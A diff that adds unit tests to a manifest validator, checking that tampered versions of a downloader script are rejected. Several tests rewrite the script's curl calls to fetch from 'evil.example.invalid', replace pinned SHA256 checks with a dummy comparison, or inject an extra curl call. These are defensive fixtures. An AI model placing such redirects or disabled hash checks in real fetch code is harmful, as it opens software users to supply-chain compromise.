@@ -101,5 +101,67 @@ class ManifestTests(unittest.TestCase):
             self.validate(spec=spec)
 
 
+    def test_valid_but_wrong_tag_sha_is_rejected(self):
+        spec = copy.deepcopy(MANIFEST)
+        spec["source"]["tag_commit"] = "f" * 40
+        with self.assertRaisesRegex(module.SourceMismatch, "Reviewed unsigned tag commit changed"):
+            self.validate(spec=spec)
+
+    def test_linux_url_constant_retained_but_curl_call_bypassed(self):
+        altered = FETCHER.replace(
+            "str(archive), url], check=True)",
+            "str(archive), 'https://evil.example.invalid/engine'], check=True)", 1,
+        )
+        self.assertNotEqual(altered, FETCHER)
+        with self.assertRaisesRegex(module.SourceMismatch, "downloader no longer consumes"):
+            self.validate(source=altered)
+
+    def test_windows_url_constant_retained_but_curl_call_bypassed(self):
+        altered = FETCHER.replace(
+            "str(archive),url],check=True)",
+            "str(archive),'https://evil.example.invalid/engine'],check=True)", 1,
+        )
+        self.assertNotEqual(altered, FETCHER)
+        with self.assertRaisesRegex(module.SourceMismatch, "downloader no longer consumes"):
+            self.validate(source=altered)
+
+    def test_macos_url_constant_retained_but_curl_call_bypassed(self):
+        altered = FETCHER.replace(
+            "str(image), URL], check=True)",
+            "str(image), 'https://evil.example.invalid/engine'], check=True)", 1,
+        )
+        self.assertNotEqual(altered, FETCHER)
+        with self.assertRaisesRegex(module.SourceMismatch, "downloader no longer consumes"):
+            self.validate(source=altered)
+
+    def test_linux_digest_check_bypassed_with_hash_constant_unchanged(self):
+        altered = FETCHER.replace(
+            "!= digest:", "!= '0' * 64:", 1,
+        )
+        self.assertNotEqual(altered, FETCHER)
+        with self.assertRaisesRegex(module.SourceMismatch, "enforced pinned SHA256"):
+            self.validate(source=altered)
+
+    def test_macos_digest_check_bypassed_with_hash_constant_unchanged(self):
+        altered = FETCHER.replace(
+            "!= SHA256:", "!= '0' * 64:", 1,
+        )
+        self.assertNotEqual(altered, FETCHER)
+        with self.assertRaisesRegex(module.SourceMismatch, "enforced pinned SHA256"):
+            self.validate(source=altered)
+
+    def test_extra_curl_path_is_rejected(self):
+        trigger = "    with tempfile.TemporaryDirectory(prefix='ccbaga-engine-') as temporary:"
+        self.assertIn(trigger, FETCHER)
+        altered = FETCHER.replace(
+            trigger,
+            "    subprocess.run(['curl', 'https://evil.example.invalid/a'], check=True)\n" + trigger,
+            1,
+        )
+        with self.assertRaisesRegex(module.SourceMismatch, "exactly one audited curl"):
+            self.validate(source=altered)
+
+
+
 if __name__ == "__main__":
     unittest.main()
